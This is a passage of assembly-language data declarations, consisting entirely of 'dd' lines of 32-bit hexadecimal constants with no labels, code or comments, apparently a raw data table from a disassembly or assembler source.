		dd 9FF40598h, 634AD4F9h, 6C101368h, 0FF1B2C12h,	0A17803BEh
		dd 18226F0Bh, 49C90C3h,	0F4234C7Bh, 0FBD39A64h,	0EDB036BBh
		dd 7288961Eh, 44BA03Dh,	0EC5F976Fh, 246CD99Eh, 9C038CE8h
		dd 4625DD5h, 441389F9h,	17921303h, 42F82C61h, 9805807Fh
		dd 0F52440B6h, 5D5714FCh, 947C895Bh, 0BB61EC8Ch, 0E58502Dh
		dd 0C307B6E4h, 0A619226Ah, 518C2FA5h, 61564863h, 0A144D2FCh
		dd 607E182Dh, 0CCA44505h, 0B3D1CEE7h, 319CA86Dh, 5F139F9Ch
		dd 0B86C62E0h, 4C6F85F4h, 9E4DF601h, 18627E5Eh,	0A88709ADh
		dd 0E2F27C11h, 0AFCF4FBAh, 0A87786C1h, 0DF09B10Dh, 467D7DD1h
		dd 9B4C0537h, 0C149A060h, 0E30E9BB0h, 0DCCF1703h, 0EA36DCC7h
		dd 25252461h, 60B8B6A8h, 5252F611h, 0D17346D8h,	62A74AEDh
		dd 0C8D9DC93h, 6C530F6Eh, 78C59368h, 8E3A077h, 0B8E2181Dh
		dd 0E8121A3h, 7FD7117Dh, 0BBA5E88Dh, 16C9B575h,	26C5E5Ch
		dd 44EAD2B3h, 82079EBFh, 3CF3391h, 0ABE227AEh, 0D2FD4041h
		dd 0E1C88907h, 6A891D30h, 2B01D0C3h, 36924D5Dh,	187897FCh
		dd 137A9CCCh, 9A51C011h, 5D82509Bh, 8794A774h, 0E9149EE4h
		dd 1F94CCE3h, 0F1A28105h, 0E7C07A4Fh, 911C36FBh, 2A1A2601h
		dd 436F7323h, 54C259DAh
		dd 3F89470Ah, 0ACBDEFB4h, 0FD520EC9h, 0FB9304E5h, 6D55D039h
		dd 5C387ED9h, 0E6ABC53h, 0FF7F04B6h, 0E1D7F7BCh, 5FDC4182h
		dd 6656B2DFh, 84118BD5h, 2F50D156h, 80929B31h, 6AD0871Fh
		dd 84262C6Eh, 2DA82184h, 76ED54B6h, 0C05C747Fh,	0DE9CE45Bh
		dd 0AB3C2132h, 5E1B174h, 9AABF9E2h, 1512572Fh, 0AA1A4662h
		dd 75737CBBh, 66777CC1h, 1759D000h, 0F5C5B6C6h,	9543E8DEh
		dd 68AEE9CBh, 0A3C976Eh, 0A9C131C2h, 0F4C61B0Fh, 62CB84BFh
		dd 8E3D711Bh, 0D150CAE1h, 0E4799F87h, 9E5A88B0h, 0AB07A8CEh
		dd 0FD17DC8Fh, 3AD2AB40h, 2B01A781h, 0BDFB3E7h,	8A3CDC4Ch
		dd 140D262Fh, 0DDB00D3Bh, 0FA7E12C3h, 9354DBE1h, 6177FA27h
		dd 0B071CA49h, 3A83BFAh, 0DA6FEE7Eh, 8C5428FCh,	7B8352D8h
		dd 0DE356378h, 12727A5Ah, 6A49D97Dh, 0A599055Eh, 1F239B11h
		dd 0F20CB493h, 0B33DA608h, 6E586F9Ah, 83719378h, 3CEDC40Eh
		dd 0FECD1B84h, 40EBB191h, 9976774Fh, 81E80CAEh,	0F180345Ah
		dd 4A0413BBh, 0ECD5C8E2h, 0AA3AE8AAh, 4338D501h, 0D33DDD48h
		dd 0E5915C9Fh, 30C63030h, 0DDFCE23Dh, 8F218BB9h, 88F632EAh
		dd 55F71780h, 5A209713h, 0A9689754h, 0A48A5795h, 6289993Eh
		dd 9F6B6CAAh, 0AE4D765Ah, 0ECDA2E9Ah, 0B03B7546h, 403109ABh
		dd 0E2970829h, 345FDA83h, 0FF2ABD05h, 9B1F1DBFh, 897B9442h
		dd 916185FAh, 32C9F622h, 5E6A5E61h, 0A6B4AB1Ch,	42D4B1ECh
		dd 0D41737D3h, 0B6C94D7Fh, 9C0FED1Dh, 5337E83h,	61C02975h
		dd 41291F0Eh, 0AD66F34Eh, 6B0558E5h, 0B750A2B1h, 2D94F426h
		dd 0C14B3375h, 0AA0F1490h, 7A10980Fh, 0BF3FDEBBh, 3B2DC66Ch
		dd 0D3B1F10h, 1111B9DFh, 0A200F4A0h, 0DD9AD811h, 944189FAh
		dd 0C4A974D3h, 7E5DB4B7h, 0A052F7CCh, 0F37D61ACh, 482EDF21h
		dd 9802A30Eh, 9D3F68A1h, 0F5BD1043h, 3E16FCC7h,	421E8714h
		dd 0B5BC4481h, 7721BDF6h, 44404D7h, 0B349D826h,	0D1B87780h
		dd 49A46615h, 0B4C0F3EDh, 0E92396BBh, 0F3E504B7h, 0E2407278h
		dd 4984A80Ch, 29CFBDEDh, 0CE5355F1h, 273970D7h,	26E7A536h
		dd 0CFD05037h, 7AA820E2h, 0C320FBCFh, 0A08BFE4Ah, 5885F0E1h
		dd 0B0344BCEh, 69F9B032h, 775CC1F8h, 11942273h,	0E20C264Bh
		dd 97A9E4DCh, 0D0D37599h, 0C36A9CECh, 16AE0ACh,	6A0CABEDh
		dd 2132355Fh, 0EF8DF145h, 0B224591Ah, 4A16217Ah, 0B1DBA141h
		dd 188D4278h, 8FC88146h, 0B4C0C4B4h, 56BF45ACh,	63522851h
		dd 297D8017h, 0E58F708Ah, 6158ADB0h, 0E420EE24h, 876B2CFCh
		dd 0D377B320h, 3B2FD4C2h, 0C36FB16Eh, 3F311555h, 0F7C7263h
		dd 47FC22E3h, 65562CE2h, 0A3EE14C3h, 0CF084E37h, 8DDFBE7Ah
		dd 41826F65h, 999C066Bh, 251CCE46h, 10B64D80h, 99D93103h
		dd 6EECA577h, 35B4CFE8h, 61E1B688h, 3A6ED8C9h, 6E2CC0A2h
		dd 15886E6Bh, 9C936338h, 7103F99Dh, 3ED80911h, 0FC6F6633h
		dd 89E7020Bh, 1E015019h, 87EF4CE5h, 0F6CD8239h,	1C9D2B14h
		dd 723DB267h, 0A125FFE0h, 6CBF2B00h, 0FA401E2h,	0F4F69213h
		dd 8144D968h, 12D2FE32h, 2577AE7Ch, 44EFD8AAh, 2641F6C2h
		dd 0FD5F6D22h, 2C3632D3h, 0A9EEB505h, 9953D26Ah, 0F183FFA2h
		dd 100143FCh, 421F1723h, 0FDB8F82h, 5F520975h, 0CA452B1Fh
		dd 0B7ACC111h, 0E86B3AA2h, 447CA430h, 681526B0h, 85F127DDh
		dd 83610D51h, 21515849h, 75EE3355h, 99CD121Bh, 89939427h
		dd 18D99A68h, 0B795E859h, 82D0ADC8h, 0AD512560h, 3DCF2731h
		dd 0E84E7BCFh, 57FAA074h, 6A4060CBh, 75C1C140h,	0DC835503h
		dd 7A833BB3h, 0D380199Ah, 7FE73E14h, 381C5F1Ah,	95DEB4D9h
		dd 3281762Dh, 74413CF4h, 89C07EA1h, 0E3994290h,	0B1DD8B84h
		dd 53E76C34h, 24B1B152h, 0C2CCF27h, 69ACC3EBh, 0D59F2C9Fh
		dd 967D8125h, 2C691DA6h, 651F8110h, 0CB5B5379h,	46D71C37h
		dd 0D0E5946Ah, 51750094h, 8C7B25BFh, 0D5981EE2h, 12DB9A1Eh
		dd 19BC3544h, 0B4DC2BA4h, 4C8A69CBh, 2AC7D558h,	18AD7622h
		dd 0E1CAD009h, 9D28DFAFh, 0A3462019h, 1232DE95h, 11135B3Dh
		dd 0BD9C6B47h, 64CF01F3h, 52212960h, 9A8332A2h,	2FE8F892h
		dd 0EB4C536Bh, 5B4F98DBh, 8B69CDA3h, 0A32C02B8h, 0C03DC960h
		dd 83F50CD4h, 0ACDA62B5h, 0DD88909Ah, 0B04D48C9h, 2BB39167h
		dd 9AAB7736h, 48F740F5h, 328996F4h, 460A9B0h, 7897B8CCh
		dd 59DF5916h, 77A73DE0h, 8E28E1D1h, 0DE425629h,	0EF222CBAh
		dd 0AC100B5Dh, 43A4662Ah, 0D823A593h, 6A3593A5h, 84AF0F39h
		dd 0BF67D45Ah, 2BC6B188h, 1B926ACFh, 0B408D6BEh, 67D98714h
		dd 4BBDDFBEh, 0CD79A03Eh, 0B420D441h, 17723B6Ch, 0CA21438Fh
		dd 1DC8724Bh, 0B94DBAFh, 0C0503CEDh, 14E330FFh,	0CAFEF075h
		dd 1EA29B24h, 9B68D87Ch, 0E38E95D4h, 366E6A6Ah,	0F3D35B40h
		dd 3C17E775h, 0F313E176h, 0A8C5C8B5h, 676E806Bh, 4B0EDE23h
		dd 9CA9928Dh, 23849248h, 301E6572h, 4A3D645Dh, 0DD7401Ah
		dd 7A6EB980h, 2FB0A21Bh, 17AB57AAh, 0CF10615Bh,	0E65F3D8Bh
		dd 0F4FD6FB1h, 94F294CBh, 0DB222728h, 30AC122Dh, 9E4625A3h
		dd 819BD4D5h, 315A1EB5h, 123D3F50h, 0AF2A9E2h, 0B9167710h
		dd 0B618A112h, 0C3802B84h, 7FB8E5F9h, 8C86FBBh,	0DBBDF9E7h
		dd 21365277h, 0F6C96962h, 0FFC5161h, 1EF871B7h,	0E07A4BC6h
		dd 0D47189F7h, 83432ED4h, 0B36E2C9h, 1461B556h,	0AE0985C0h
		dd 0CAC211C4h, 8DF1FFEAh, 108AA0D1h, 0A3D99F56h, 7693417Ch
		dd 0EF55E77Dh, 87775C4h, 8FAE5863h, 74A3E43Ch, 0F37CED6Ch
		dd 0C4F2308h, 5C8D620Ch, 57738DF3h, 65F10B8Dh, 89938477h
		dd 7E9CE80Bh, 2A2CBEC3h, 0FBDCD53Bh, 0BAEF33E8h, 62D51807h
		dd 15E815Ah, 1C5F0869h,	33C7F268h, 3E60AB6Eh, 79BCC075h
		dd 6012C956h, 616E5397h, 0FDA89FD5h, 0B2D9C488h, 9A47B4FAh
		dd 1E4E8235h, 662C9763h, 739ADA8Fh, 0ADE43939h,	0D622006Dh
		dd 9B1C67B7h, 0FC0B2E2h, 2552AB28h, 46457CE4h, 0B6DDE33Dh
		dd 6B1EFC06h, 0BFEB71B1h, 0F3AC6152h, 7C2BAC62h, 0F0084349h
		dd 7A3D20E1h, 0A7B4D328h, 0CDDB66A5h, 0A248B2EFh, 1776C548h
		dd 4B0A747h, 1D9AB7Dh, 4E993DEh, 46B46F8Eh, 7FB6453Ah
		dd 0AEA0F8B8h, 46FB343Ch, 90116A31h, 0BA2A8CA0h, 358B8429h
		dd 0C0B0B5A8h, 7AF47BB6h, 0DEF8F9C3h, 2D111592h, 95C2AD8Dh
		dd 1AEAA03Fh, 6D5F2876h, 5B0185A6h, 1EFB89E9h, 60978329h
		dd 5D1580E7h, 920470Ch,	409075B5h, 93CC9596h, 3E4E88CDh
		dd 0DCAA0A16h, 0CC41FB4Eh, 0F22579A6h, 5F1AE442h, 0CFF252Ch
		dd 2738CB3Ch, 1C3E4BB0h, 0A4F8E2F2h, 981C3D40h,	77562EAFh
		dd 6192E4F9h, 0C90E2730h, 6A5312B8h, 56CF247h, 74FBF5FFh
		dd 7C508620h, 455650E3h, 0D1F1BCC3h, 5736C7BDh,	4E77C775h
		dd 0FDF594ACh, 0BA805E3Fh, 0BC0ACFF1h, 15E8CF0h, 951953F8h
		dd 0AA0392FBh, 1617C6CFh, 3C52C68Bh, 75CF8D81h,	72BFF4D6h
		dd 21E4ED1h, 41763F58h,	42F32DD7h, 14F7B789h, 2BE74657h
		dd 815696B0h, 330D5E52h, 2F71331h, 0DFFC0578h, 9E1ECC7h
		dd 2FE4DE98h, 4D79A22Bh, 6BB880D5h, 0E9817B9Bh,	9D787B3Dh
		dd 0E11C2E55h, 97D24117h, 2A8C23A6h, 279B7051h,	0FE1DB537h
		dd 0B6CD5A32h, 0A2BBAC4Eh, 0A836B149h, 0BA8989D1h, 5DA0EF81h
		dd 0E97DB7h, 46BAA6EBh,	0D4F5D407h, 54C329A3h, 16F2AFE8h
		dd 44FD4DD5h, 0E842F29Bh, 2899D5F0h, 121E7133h,	1801986h
		dd 0E32445F6h, 3434AE6h
		dd 4057EB3Bh, 4B283C71h, 617EDCD8h, 26E6F384h, 41798128h
		dd 5EF2A1B4h, 0C419123Bh, 1D70E092h, 891799DAh,	0F951472Bh
		dd 0C5EC30AFh, 0C14EF6E5h, 423B299Ah, 0CBDD0BEAh, 0EE96D66h
		dd 2D70062Bh, 5F506DDDh, 6EFA4120h, 0FCA797FFh,	0E353464Eh
		dd 1B90D8B7h, 62502392h, 0D4D2CF60h, 0F92E8383h, 0E9AB553h
		dd 448E63ECh, 0E5826052h, 55C3240Ah, 8A9FC953h,	0C94DC1Ah
		dd 61390155h, 0BEB66764h, 0A7A1B552h, 0C78DA0EEh, 0F8D457D9h
		dd 7413BE97h, 0F9068A33h, 2BCA7DC3h, 46C1B3F3h,	88F9A682h
		dd 44D63B76h, 56CDF791h, 973C3969h, 3CD808Bh, 0BF4BF9CBh
		dd 39547BC4h, 201D9DAFh, 1C0CB89h, 9279915Ah, 478C0767h
		dd 1A14094h, 1E46DA14h,	0ED7BDBD2h, 92F6C8EDh, 859AD0Eh
		dd 0A20E0539h, 50F76E25h, 6943CE35h, 820CCB9Dh,	9EF17400h
		dd 9D6A4427h, 2B8923ECh, 257383C2h, 6737446Ah, 752930C1h
		dd 0A67FD0A1h, 0F3521ACCh, 0A668228Eh, 0BA470EB3h, 0BF164DC2h
		dd 39FE3A1Ah, 300B4EBFh, 8F572E41h, 48ACECF0h, 0B3DC745Dh
		dd 37E1E3CDh, 3D21A369h, 568D9998h, 0A109E188h,	203B18B9h
		dd 0D86F354Ch, 20A3F1E9h, 0ECBBFCFEh, 7E91491Bh, 0E6887B3Ch
		dd 1F5962D2h, 43F6541Eh, 6A73895Fh, 128F41DCh, 0A979A765h
		dd 0DF66913Ah, 0D75D06D0h, 96C54C55h, 13A9E38Ah, 0B95046FFh
		dd 0B18451A0h, 0F30C2737h, 0E19F226Dh, 0EFED5F15h, 21775AAEh
		dd 0E5D537FDh, 0CA27FFEAh, 81CAF8D9h, 35BD0A75h, 1A5B6326h
		dd 14415016h, 0A96E4C8Dh, 28EE0063h, 7CA95965h,	4070085h
		dd 3B37CE62h, 0E80C3E06h, 8A9CE53Ah, 62A8A779h,	0E73651F9h
		dd 2FEEC42Ch, 0BD1C1A99h, 22EDC4E7h, 4D68324Eh,	753CD80Bh
		dd 7D440E16h, 4633B11Ah, 43FC2658h, 4D171166h, 510AEF26h
		dd 45DACD44h, 0A3AB6614h, 0B0013188h, 98E501CEh, 0DE421E23h
		dd 0F12D6C4h, 748F3F28h, 76D921DEh, 624AE916h, 37F39910h
		dd 9CF472C0h, 1CAA73B9h, 75CC7F19h, 927A5A1Eh, 68F1DBC0h
		dd 85A31F4Bh, 87D3A709h, 0D2DCA0B3h, 0FEE09E41h, 2FD0142Bh
		dd 20311C58h, 0EB9D3669h, 0AE40213Fh, 0FA919474h, 0D63B22E7h
		dd 8CA533BCh, 3D0410CFh, 818F40B5h, 6A2ABF3h, 0B018F2FBh
		dd 17AD3266h, 0CEA9B4D9h, 0E2E8E1BDh, 8ACE6876h, 0A464C7B8h
		dd 5FCF719h, 0CCF900DAh, 6C84AAA8h, 0C11FA5A4h,	573EC013h
		dd 0F97415F4h, 0F67BDA90h, 8B0C7D78h, 0F73D9C19h, 34DA2736h
		dd 73B5D5A9h, 38DBDD54h, 8B6F9116h, 2B5E4DA5h, 77DF7D2Eh
		dd 6D1C0897h, 230BE3E6h, 681AD402h, 5A32D40Dh, 2E0F6E5Bh
		dd 0DD0E0D2Fh, 61749393h, 45F26E37h, 8A250AD0h,	0DD8E948Ch
		dd 908D3396h, 0D4FBF831h, 625A7607h, 9311698Ah,	0A0A32FC5h
		dd 0F3429384h, 34586039h, 61C72B8Ah, 6BC954ADh,	0A80310D5h
		dd 0D14194ECh, 187517A0h, 843133CEh, 8B235132h,	3837881Dh
		dd 1D813074h, 15102BDCh, 0ECC48F1h, 342A4A34h, 7504111Dh
		dd 54644141h, 0C13F15EDh, 0E14B17C0h, 0EA5A41B8h, 0FF73D6FFh
		dd 62EB6F89h, 0CC9F3A5Ch, 0C1D58D88h, 6216DA11h, 9A68B025h
		dd 4E52119Dh, 0EE730A25h, 3D1A8A3Ch, 0CA454A66h, 0D94F1B18h
		dd 728B9D71h, 82D7254Bh, 0E9F6CE01h, 0C0775361h, 0FD70FE9Dh
		dd 9680285Ch, 0F9253BF1h, 0EEFDB8EBh, 2C73672h,	4F334452h
		dd 1B1F743Dh, 6E8C522Ah, 29133A82h, 0BF753775h,	0A37369A4h
		dd 734AC6AEh, 4FFD985Dh, 0BB20BA77h, 0B9FCE6F3h, 79F6B1CFh
		dd 0F3562CC3h, 977A0873h, 9FF6FE99h, 0F9EFAD81h, 67EB805Dh
		dd 69F2540h, 0B11F8D2Fh, 79935668h, 0B338C515h,	5D28F195h
		dd 7B23BD1Ah, 0B014B817h, 4F5D05F0h, 0B72C393Ah, 2D93AB73h
		dd 0EDF52AEBh, 0CE9894D0h, 5D4E0424h, 3B18BEBEh, 32D15D7Dh
		dd 0C13E98Ah, 5D890579h, 0B0C3E431h, 76640179h,	269E0022h
		dd 694B7B89h, 0ABA32F90h, 462F7E99h, 17488F18h,	3B6D1FEBh
		dd 68E1690Ch, 0FECE947Ah, 5B2E74A9h, 2E3169DBh,	777F9824h
		dd 13AC4BD0h, 0D83CFCACh, 55C9ABD7h, 7CA20DCFh,	0E34E4863h
		dd 3C5FD4B4h, 0FCDCE596h, 7C72F333h, 0F8919CE7h, 17D85502h
		dd 0E7316526h, 0A1352D94h, 0CD7A77F8h, 90CA24C6h, 0D069FA15h
		dd 794158A6h, 0FD6A5C69h, 0A9500B3Ah, 500253ECh, 993A2CADh
		dd 0D7FFB20h, 736A3904h, 63B0DE86h, 2C96A120h, 52C46FD1h
		dd 6A6FF266h, 33D02224h, 0ECDE922Dh, 2C60A117h,	120904B6h
		dd 2862961Dh, 0E1690AEh, 475A1FD3h, 5EC13378h, 80B6565h
		dd 60FEE69Ch, 4B3A596Dh, 0FFB01A9Fh, 0FD324BC7h, 0C63F28CCh
		dd 0BA64BD8Ch, 33A623C4h, 8B8463B2h, 0D49C7537h, 0AEC0A26Dh
		dd 56442511h, 0BA8080B1h, 0ECE86914h, 29416737h, 7857CAAh
		dd 5B5E3A40h, 0F9B90F6Bh, 0E43C36C5h, 19296148h, 0E0DE3589h
		dd 9BD05BB7h, 954B6F7Ch, 764C621h, 1D59B374h, 0A6405EA5h
		dd 0D992778Bh, 8109EC66h, 582BA9EBh, 0F20A1527h, 726A8EBh
		dd 5C3185A4h, 1908C7CDh, 30BEA97Dh, 380E6D43h, 0CD151570h
		dd 137F00F5h, 3D7C2EECh, 9AF657C7h, 0E469F0A9h,	0E2E44AD4h
		dd 7D25680Bh, 0A2C339B7h, 0AF6893E4h, 0D35DBD56h, 10EB6AE4h
		dd 7CECE1E6h, 6F38911Ah, 9788ED00h, 0A0205649h,	55ECD017h
		dd 0E6E46BBBh, 0E3F4F66Ah, 0B843F2B6h, 76EAC06h, 0C93D11F7h
		dd 0F2DAF5A0h, 0CB2E3F1Ah, 6F01DEE5h, 626F413Eh, 0DD53806Eh
		dd 791A6161h, 0E855A938h, 0A6DB82B3h, 0CDB0714Ah, 7FA1E5C4h
		dd 0ABB693F3h, 57A99046h, 0DC40086Dh, 0B22EE31Dh, 5D71FEA1h
		dd 78DC1640h, 1CBCDD47h, 45DEC1A4h, 42E212F0h, 60D12A28h
		dd 0D21787BEh, 4DD8A612h, 603B4262h, 6FC233EEh,	0C4132A3Eh
		dd 0DD827603h, 98D5FE96h, 4C36DF54h, 6D7A88BFh,	0C83D2DFCh
		dd 504F02D2h, 0EDB38E83h, 2274ED80h, 12AE0ABBh,	0EB218831h
		dd 2ED85002h, 5480DA74h, 0A1EDCB53h, 0E8799A98h, 0C9F27052h
		dd 0F11663ADh, 0C6392762h, 3F3AB04Dh, 0EB5EFBECh, 9AAE6BBEh
		dd 546009BFh, 16CA9F6Ch, 1F3CD72Fh, 0ED9D4AFDh,	9CFC55E4h
		dd 13C05829h, 0FE2CA0BDh, 0A70623DAh, 0F72B5AB0h, 506BA0A7h
		dd 0E6871B40h, 8B0E9F3Bh, 539EB3FDh, 0B00109EAh, 0EBECD93Ch
		dd 5B1B76EEh, 4C2E3572h, 4B0035FCh, 8FFC5C39h, 3CF7A33Fh
		dd 6BCDE641h, 3E0ADCF3h, 5A5813BCh, 0FF80414Ah,	5CAB6127h
		dd 1F0774AFh, 0CC20B2B8h, 6F5B3EFAh, 0A1226E98h, 3E055771h
		dd 6566203Dh, 1AADBF2Fh, 0EBBB2989h, 40816369h,	66E394D0h
		dd 0BDE95ED3h, 0BBE1A601h, 611C1476h, 0CB3D786Bh, 299890A9h
		dd 2E290F3Fh, 0EA568599h, 780893F1h, 566E27E9h,	199687B0h
		dd 0F12919C5h, 903403ECh, 0E655ADE4h, 0E4EA113h, 0D1D25797h
		dd 0C5CAF04h, 0AD385A9Fh, 88FD2A9Eh, 3A85EF73h,	134032EBh
		dd 2F63AB3Ch, 68B1345Fh, 0E9598E01h, 7FF725CFh,	5EDF72DDh
		dd 15FF6E10h, 31AA08Bh,	88667BF1h, 442626B8h, 2380DC4Dh
		dd 1E946A97h, 0CB5F7C4Fh, 0C4765512h, 0D35F66E5h, 0E2537091h
		dd 937A07E5h, 3E30C3C8h, 776ED1BAh, 895D99BFh, 0D2B2DEB1h
		dd 881341DAh, 112A7DB1h, 1D069FE4h, 1FFBE61Fh, 0B56A8DCCh
		dd 0A0CCB8AEh, 0F7FAD94Dh, 0AA7AFFB4h, 329AA37Bh, 2EA0F166h
		dd 0AE9438CEh, 0CCD7F08Bh, 0D15E8B04h, 344E32B2h, 90EF4711h
		dd 25B31362h, 0E13C469Dh, 130AED90h, 2ACA8B63h,	466AE0BBh
		dd 515AEAA3h, 1335CF0Ah, 0D6329E26h, 0BC977392h, 2BA496C0h
		dd 0FE78AFCh, 750F442Bh
		dd 9B23A905h, 0F91516BFh, 74F946EBh, 2C3D60BAh,	2B353E04h
		dd 0DCFA1155h, 89890769h, 9D284D3h, 0DB79EA4Bh,	43158D95h
		dd 0E0B68167h, 4EF818DCh, 51D2BA6Bh, 24BA81C1h,	83749AEDh
		dd 28DE2628h, 0CBDF180Ch, 545A6238h, 0DCF27423h, 5C5504h
		dd 0A86FFCF7h, 1EBDB554h, 6571D29Bh, 0B915DD7Dh, 9C00BCDh
		dd 467537DCh, 8A8610D6h, 3965B63Ah, 2BF29015h, 21FD2082h
		dd 9AB1F9h, 4E0BDDEEh, 3F99C1B3h, 7697060Dh, 3B57D879h
		dd 3C9EBA6Fh, 0DC00071h, 66CA8949h, 4561CE4Ah, 0C8EB9E26h
		dd 3A0ED8F4h, 0DB109CCDh, 0D8288C23h, 6372F64Ah, 74259385h
		dd 0B941436Ah, 0EDFA035Ch, 0A052D612h, 12C19D13h, 3BAD9246h
		dd 6FFAFD80h, 0EC6B4B46h, 75AA4E81h, 4C436294h,	8EEFB8B6h
		dd 0F5E3B727h, 9D027BD3h, 0EC394EFCh, 929F7C92h, 0B742F4F2h
		dd 0A2DE4644h, 628B7277h, 81FEB4C0h, 146A3AA4h,	6A77D25h
		dd 4B4EF15Bh, 849C5D65h, 0DEFFED08h, 29117F37h,	0D4F5FD37h
		dd 4A01D4D3h, 85F797EDh, 80EE364Bh, 75480E05h, 0F4871930h
		dd 65AEC13Dh, 0A7B974E2h, 7A602555h, 2145C1C5h,	90A0B7Fh
		dd 2EB0C0Fh, 0FEDF5EADh, 0A723CE5h, 297AF724h, 652DA6D7h
		dd 304956A6h, 5A6812A0h, 0B6623BA9h, 0D6A87FECh, 0F03C0B16h
		dd 555D1956h, 2B5BADh, 0BA80564Ch, 8952C89Eh, 3200FD7Eh
		dd 61030B8Eh, 1BD15AC6h, 0B4A2A601h, 0A1E27DC0h, 6F0A1B3h
		dd 9C6CCC32h, 2C4871D9h, 9D69C5Eh, 9F1CCC63h, 3C9BA506h
		dd 0D120F59Ch, 1C1EEE27h, 1AA88CD4h, 1D911F95h,	324B5F1Dh
		dd 62451EAh, 5A3F7770h,	0BAA34922h, 0D00B754Fh,	843C0F06h
		dd 0E2D5E1B5h, 44A34261h, 0D4DEB370h, 0B4EC520Eh, 4CC82260h
		dd 33A37293h, 3F41CD73h, 3BCD5041h, 0AD41484Ah,	3A436241h
		dd 0D82F89B7h, 8B989C8Dh, 0DDD09EC7h, 0C570C261h, 0BAC62864h
		dd 4588A4C2h, 0C1411327h, 1DBDBB99h, 5DD948F2h,	227FD088h
		dd 165219B1h, 16A3E505h, 0D14561B8h, 0E73F76Fh,	0C3086FD7h
		dd 58CFE723h, 7F417F0Ch, 0A6504D55h, 4E70D3FFh,	0F59238E0h
		dd 0B219933Eh, 6D350D62h, 5DBBD6D5h, 1BCC47EEh,	1874F12Ah
		dd 261AFFF8h, 0E6BD03E9h, 0FED00E01h, 0AB26ABCh, 37F8B8EFh
		dd 730A52C2h, 16803EDh,	0E4FB68F2h, 59FFDB2Eh, 0B62F0BBCh
		dd 7323208Dh, 7888B439h, 0C6E93F94h, 0F9C6CE3h,	987B4A75h
		dd 890432AEh, 0C1B0340Eh, 0CF8AF14Ch, 7F419018h, 28C8F28Dh
		dd 9D740E09h, 7E8B921Ch, 0E570D6BAh, 92A0FAB5h,	2334FCA3h
		dd 4BF431D9h, 0A27346CEh, 0CAE2A1C2h, 9DFA3A65h, 0E98A6B80h
		dd 0EFCAD695h, 0F5118170h, 9040806Dh, 0D39A3EA3h, 0FB67A193h
		dd 21D187D3h, 842551E7h, 0E74F3A76h, 7266090Bh,	99E10F7Dh
		dd 34F6EDD1h, 2E74EE04h, 30EC43Dh, 2E725A86h, 872D9948h
		dd 0D7978780h, 0F12FB93Dh, 1E0EA090h, 0DA17705h, 9C7991CBh
		dd 781578F5h, 87F4BC43h, 0B64BAFEFh, 63BF5882h,	0A6B2C3CCh
		dd 9230E976h, 955DDE12h, 13E5F275h, 69D346A4h, 0FCE2C8D7h
		dd 0BE081611h, 0A999B1E6h, 0F4C5D245h, 0FB7F087Eh, 4261E729h
		dd 0F256429Bh, 2CE47770h, 28594191h, 9F1B4900h,	0E1A46B60h
		dd 91314D5Ch, 76B7CF5h,	8B3EA933h, 0BB2BBA10h, 3CEC921Eh
		dd 9086879Fh, 626991EDh, 5751FE1Bh, 0DB6F9BA8h,	0D4B24080h
		dd 760843F0h, 2280B45Eh, 16F1BB00h, 0B9AB0E65h,	0FE3615A3h
		dd 0A63D428h, 58585946h, 11F5F3C3h, 5823203Dh, 0AE6FF7BAh
		dd 9C8CFBF9h, 7BC9F5B6h, 28DC6304h, 805CA8B3h, 218E3CDDh
		dd 45B3C6AFh, 36AA8BE2h, 3AD0D1ADh, 0C9A0E081h,	67D7C551h
		dd 1C4C22DAh, 79BA9922h, 1F7738AEh, 0A94E3705h,	44E98086h
		dd 52F7CA0Dh, 0BEBB371Ah, 0C8665355h, 5FFAB1EDh, 9CA44F82h
		dd 19EE4840h, 99C7E5C6h, 7EFFA442h, 3D68F8A0h, 4AAF1A15h
		dd 0CED11478h, 6B62ED66h, 90545BFEh, 3DCB0A40h,	71D0F314h
		dd 9DB78865h, 88D26A3Fh, 0F7046162h, 0DB61A405h, 790EF76h
		dd 0B08C4017h, 0EF9AC380h, 62AD135Ah, 102891D4h, 73D9F195h
		dd 0F440E82Eh, 27CAB29Bh, 45BDEA60h, 4613AEFFh,	87B1CF3Ah
		dd 14CE6F1Ah, 0B8CF8099h, 1ED5E744h, 99D22BECh,	5947C2CBh
		dd 0E9B6ED39h, 5EE13E3h, 0F66BF8ABh, 613EFA1Ch,	0D17C80Bh
		dd 0BF5A1404h, 6F78DC70h, 993E7ED2h, 4E3C82D3h,	7B881E1Bh
		dd 0E0903347h, 0E824071Ch, 3ACF5151h, 87D90219h, 5FA337EEh
		dd 143273EEh, 0C8939E81h, 256625E7h, 0C54B0C3Ch, 0EB993361h
		dd 35C86704h, 0B07BD731h, 0A192CBC4h, 26C28C33h, 4AE2E65Ch
		dd 0A97F5B84h, 2EDC8D51h, 4E8B4B87h, 0D1706189h, 0AFB863A5h
		dd 26B15E5h, 4B4E773Fh,	6A2447B6h, 4F09D9DAh, 9C0A02Ah
		dd 0F141CF19h, 4097DF88h, 4012331Dh, 0A706F7B6h, 76CAB6A7h
		dd 0F14270AEh, 751510E0h, 4AC6AC52h, 66CC7BA4h,	406E04DFh
		dd 61535639h, 0E2B44265h, 4C7E6672h, 0BF2F7DB5h, 111E7E38h
		dd 457D2C08h, 0CF73A606h, 64C2F5F4h, 4E32042Ah,	633A2BF8h
		dd 0B33B87F4h, 34F03D7Eh, 6C6F3710h, 560D0E7Dh,	0BAC19697h
		dd 219FA61Dh, 0A6617375h, 98FF40CAh, 0A7B71AE4h, 0F4D9022Dh
		dd 3CD3475Eh, 2465B1CBh, 0EE5FF5ECh, 7BC5A1Bh, 0EDB2F312h
		dd 4EE2C4B4h, 7F3EBD86h, 0D59B1819h, 0A83A163Fh, 0D07BC6A3h
		dd 4DAEDEE0h, 4CDBEF69h, 0A5A99FD5h, 0E5372E0h,	0D84FB4Ah
		dd 38C2F951h, 742E2Dh, 0F43ED99h, 18A1AC0Fh, 85F393ADh
		dd 5B1E2325h, 63293F8Fh, 5E88CEB5h, 0F5657B5Fh,	9F33114Eh
		dd 17FE0594h, 15D16E7Bh, 0E00630Fh, 28D545A0h, 69BC0613h
		dd 0E97DC342h, 781A9310h, 0C305B09Bh, 6A552A01h, 0C1B25A8Fh
		dd 0B39098C1h, 0B46477E9h, 0DE255DD1h, 1CA3BF89h, 0A2A7607h
		dd 2EA88046h, 5C50C3A0h, 0AC09743h, 0B02CB9BCh,	63A2EB11h
		dd 0AB6795B8h, 44A7EC20h, 0A484524Eh, 0C8A01F45h, 8D2F431Dh
		dd 8846C001h, 4E9E8620h, 151E6C29h, 3C4017F2h, 72E333C4h
		dd 218B4084h, 750E5BA0h, 37EE57EBh, 2501964Eh, 86CBD67Dh
